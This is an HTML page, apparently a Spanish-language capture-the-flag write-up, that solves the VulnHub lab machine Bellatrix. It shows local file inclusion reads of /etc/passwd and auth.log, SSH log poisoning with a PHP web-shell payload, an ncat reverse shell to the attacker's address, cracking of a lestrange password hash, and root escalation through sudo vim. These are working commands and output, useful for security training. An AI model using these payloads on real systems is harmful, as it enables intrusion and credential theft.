@@ -1,0 +1,254 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Bellatrix VulnHub</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://avatars.githubusercontent.com/u/95899548?v=4">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Bellatrix VulnHub" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Bellatrix de la plataforma de VulnHub" />
+<meta property="og:description" content="Resolución de la máquina Bellatrix de la plataforma de VulnHub" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Bellatrix VulnHub" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Bellatrix VulnHub" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Bellatrix de la plataforma de VulnHub","headline":"Writeup Dina 1.0.1 Vulnhub","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Bellatrix VulnHub</h1>
+          <p>Resolución de la máquina Bellatrix de la plataforma de VulnHub</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 192.168.100.12
+Nmap scan report for 192.168.100.12
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</span>
+</code></pre></div></div>
+
+<div><p>Si tiramos un curl podemos ver varios archivos del mismo nombre y el ultimo termina en .php, además que tiene un parámetro file</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> 192.168.100.12
+&lt...............................................................>
+    &ltp>ikilledsiriusblackikilledsiriusblackikilledsiriusblack&lt/p>
+    &ltp>ikilledsiriusblackikilledsiriusblackikilledsiriusblack&lt/p>
+    &ltp>ikilledsiriusblackikilledsiriusblackikilledsiriusblack&lt/p>
+    &ltp>ikilledsiriusblackikilledsiriusblackikilledsiriusblack&lt/p>
+    &ltp>ikilledsiriusblackikilledsiriusblackikilledsiriusblack&lt/p>
+    &ltp>ikilledsiriusblackikilledsiriusblackikilledsiriusblack&lt/p>
+    &ltp>ikilledsiriusblackikilledsiriusblackikilledsiriusblack&lt/p>
+    &ltp>ikilledsiriusblackikilledsiriusblackikilledsiriusblack&lt/p>
+    &ltp>ikilledsiriusblackikilledsiriusblackikilledsiriusblack&lt/p>
+    &ltp>ikilledsiriusblackikilledsiriusblackikilledsiriusblack&lt/p>
+    &ltp>ikilledsiriusblackikilledsiriusblack</span><span class="kd">ikilledsiriusblack.php</span><span class="p">&lt/p>
+
+    &lt!-- 
+        Nah...this time there are no clues in the source code ... 
+        o yeah, maybe I've already told you a directory .php? :)
+    -->
+
+/*
+   $file = $_GET['file'];
+   if(isset($file))
+   {
+       include("$file");
+   }
+*/
+
+&lt/body></span>
+</code></pre></div></div>
+
+<div><p>Sabiendo esto podemos intentar cargar el passwd</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="no"> "192.168.100.12/ikilledsiriusblack.php?file=/etc/passwd" </span><span class="p">| </span><span class="s2">grep</span><span class="p"> sh$
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/bin/bash
+bellatrix:x:1000:1000:Bellatrix,,,:/home/bellatrix:/bin/bash
+lestrange:x:1001:1001::/home/lestrange:/bin/rbash</span>
+</code></pre></div></div>
+
+<div><p>Podemos intentar leer el auth.log por si tenemos permisos de lectura y efectivamente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="no"> "192.168.100.12/ikilledsiriusblack.php?file=/var/log/auth.log"</span><span class="p">
+&lt.........................................................>
+bellatrix systemd-logind[833]: New session c2 of user gdm.
+bellatrix systemd-logind[833]: Removed session c1.
+bellatrix polkitd(authority=local): Registered Authentication Agent ......
+bellatrix polkitd(authority=local): Unregistered Authentication Agent ......
+bellatrix polkitd(authority=local): Registered Authentication Agent ......
+bellatrix polkitd(authority=local): Unregistered Authentication Agent ......
+bellatrix dbus-daemon[661]: [system] Failed to activate service ......</span>
+</code></pre></div></div>
+
+<div><p>Tambien encontramos que cuando nos conectamos por ssh queda un log</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh</span><span class="p"> test@192.168.100.12
+test@192.168.100.12's password:</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="no"> "192.168.100.12/ikilledsiriusblack.php?file=/var/log/auth.log"</span><span class="p">
+&lt...................................................................>
+bellatrix polkitd(authority=local): Unregistered Authentication Agent ......
+bellatrix dbus-daemon[661]: [system] Failed to activate service ......
+bellatrix realmd[1343]: quitting realmd service after timeout
+bellatrix realmd[1343]: stopping service
+bellatrix sshd[1685]: Invalid user </span><span class="kd">test</span><span class="p"> from 192.168.100.9 port 42476
+bellatrix sshd[1685]: Connection closed by invalid user </span><span class="kd">test</span><span class="p"> 192.168.100.9</span>
+</code></pre></div></div>
+
+<div><p>En este punto todo apunta que podemos ocasionar un <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md">log poisoning</a>, asi que lo intentaremos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh</span><span class="no"> '&lt?php system($_GET["cmd"]); ?>'</span><span class="p">@192.168.100.12</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="no"> '192.168.100.12/ikilledsiriusblack.php?file=/var/log/auth.log&cmd=id'</span><span class="p">
+&lt........................................................................>
+bellatrix realmd[1343]: stopping service
+Connection closed by invalid user test 192.168.100.9 port 42476 [preauth]
+Connection closed by invalid user </span><span class="kd">uid=33(www-data)</span>
+</code></pre></div></div>
+
+<div><p>Ahora solo nos queda hacer una reverse shell con ncat, los espacios se convierten a + y agregamos un %26 (&) para que corra en un hilo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="no"> "192.168.100.12/ikilledsiriusblack.php?file=/var/log/auth.log&cmd=ncat+-e+/bin/bash+192.168.100.9+443%26"</span>
+</code></pre></div></div>
+
+<div><p>En nuestro listener deberiamos recibir la shell como www-data</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 192.168.100.12 50596
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+</span><span class="s2">www-data@bellatrix</span><span class="p">:</span><span class="na">~/html</span><span class="p">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class="s2">www-data@bellatrix</span><span class="p">:</span><span class="na">~/html</span><span class="p">$ hostname -I
+192.168.100.12 
+</span><span class="s2">www-data@bellatrix</span><span class="p">:</span><span class="na">~/html</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos ver el directorio "c2VjcmV0cw==" que contiene un hash y un diccionario</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@bellatrix</span><span class="p">:</span><span class="na">~/html</span><span class="p">$ ls
+</span><span class="k">1c19c879fe8ef134c3e051c2d69c0c66.gif  </span><span class="na">'c2VjcmV0cw=='</span><span class="p">   ikilledsiriusblack.php   index.php
+</span><span class="s2">www-data@bellatrix</span><span class="p">:</span><span class="na">~/html</span><span class="p">$ cd c2VjcmV0cw\=\=/
+</span><span class="s2">www-data@bellatrix</span><span class="p">:</span><span class="na">~/html/c2VjcmV0cw==</span><span class="p">$ la
+.secret.dic  Swordofgryffindor
+</span><span class="s2">www-data@bellatrix</span><span class="p">:</span><span class="na">~/html/c2VjcmV0cw==</span><span class="p">$ cat Swordofgryffindor 
+lestrange:$6$1eIjsdebFF9/rsXH$NajEfDYUP7p/sqHdyOIFwNnltiRPwIU0L14a8zyQIdRUlAomDNrnRjTPN5Y/WirDnwMn698kIA5CV8NLdyGiY0
+</span><span class="s2">www-data@bellatrix</span><span class="p">:</span><span class="na">~/html/c2VjcmV0cw==</span><span class="p">$ wc -l .secret.dic 
+114 .secret.dic
+</span><span class="s2">www-data@bellatrix</span><span class="p">:</span><span class="na">~/html/c2VjcmV0cw==</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Descargamos ambos y aplicaremos fuerza bruta para romper el hash</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ john</span><span class="p"> --wordlist=.secret.dic hash
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 XOP 2x])
+</span><span class="kd">ihateharrypotter </span><span class="p">(</span><span class="kd">lestrange</span><span class="p">)
+Session completed</span>
+</code></pre></div></div>
+
+<div><p>Obtenemos la contraseña y con ella nos convertimos en lestrange</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@bellatrix</span><span class="p">:</span><span class="na">~</span><span class="p">$ su lestrange
+Password: </span><span class="kd">ihateharrypotter</span><span class="p">
+</span><span class="s2">lestrange@bellatrix</span><span class="p">:</span><span class="na">/var/www</span><span class="p">$ id
+uid=1001(lestrange) gid=1001(lestrange) grupos=1001(lestrange)
+</span><span class="s2">lestrange@bellatrix</span><span class="p">:</span><span class="na">/var/www</span><span class="p">$ hostname -I
+192.168.100.12
+</span><span class="s2">lestrange@bellatrix</span><span class="p">:</span><span class="na">/var/www</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Tenemos la shell pero demasiado limitada, es una restricted bash</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">lestrange@bellatrix</span><span class="p">:</span><span class="na">/var/www</span><span class="p">$ cd
+rbash: cd: restringido
+</span><span class="s2">lestrange@bellatrix</span><span class="p">:</span><span class="na">/var/www</span><span class="p">$ echo $SHELL
+/bin/rbash
+</span><span class="s2">lestrange@bellatrix</span><span class="p">:</span><span class="na">/var/www</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Por suerte a nivel de sudoers tenemos vim, podemos ayudarnos en <a href="https://gtfobins.github.io/gtfobins/vim/">gtfobins</a> para asi convertirnos en root y mirar las flags</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">lestrange@bellatrix</span><span class="p">:</span><span class="na">/var/www</span><span class="p">$ sudo -l
+Coincidiendo entradas por defecto para lestrange en bellatrix:
+    env_reset, secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/bin
+
+El usuario lestrange puede ejecutar los siguientes comandos en bellatrix:
+    (ALL : ALL) NOPASSWD: </span><span class="kd">/usr/bin/vim</span><span class="s2">
+lestrange@bellatrix</span><span class="p">:</span><span class="na">/var/www</span><span class="p">$ sudo vim -c ':!su'
+</span><span class="s2">root@bellatrix</span><span class="p">:</span><span class="na">/var/www</span><span class="p"># cd
+</span><span class="s2">root@bellatrix</span><span class="p">:</span><span class="na">~</span><span class="p"># id
+uid=0(root) gid=0(root) grupos=0(root)
+</span><span class="s2">root@bellatrix</span><span class="p">:</span><span class="na">~</span><span class="p"># hostname -I
+192.168.100.12 
+</span><span class="s2">root@bellatrix</span><span class="p">:</span><span class="na">~</span><span class="p"># find / -name flag.txt 2>/dev/null | xargs cat
+  _____
+  /     \
+/- (*) |*)\
+|/\.  _>/\|
+    \__/    |\
+   _| |_   \-/
+  /|\__|\  //
+ |/|   |\\//
+ |||   | ~'
+ ||| __|
+ /_\| ||
+ \_/| ||
+   |7 |7
+   || ||
+   || ||
+   /\ \ \  fog
+  ^^^^ ^^^
+user: {69e0f71f25ece4351e4d73af430bec43}
+</span><span class="s2">root@bellatrix</span><span class="p">:</span><span class="na">~</span><span class="p"># cat root.txt
+ ____       _ _       _        _      
+ |  _ \     | | |     | |      (_)     
+ | |_) | ___| | | __ _| |_ _ __ ___  __
+ |  _ < / _ \ | |/ _` | __| '__| \ \/ /
+ | |_) |  __/ | | (_| | |_| |  | |>  < 
+ |____/ \___|_|_|\__,_|\__|_|  |_/_/\_\
+  _               _                              
+ | |             | |                             
+ | |     ___  ___| |_ _ __ __ _ _ __   __ _  ___ 
+ | |    / _ \/ __| __| '__/ _` | '_ \ / _` |/ _ \
+ | |___|  __/\__ \ |_| | | (_| | | | | (_| |  __/
+ |______\___||___/\__|_|  \__,_|_| |_|\__, |\___|
+                                       __/ |     
+                                      |___/ 
+
+root{ead5a85a11ba466011fced308d460a76}
+</span><span class="s2">root@bellatrix</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
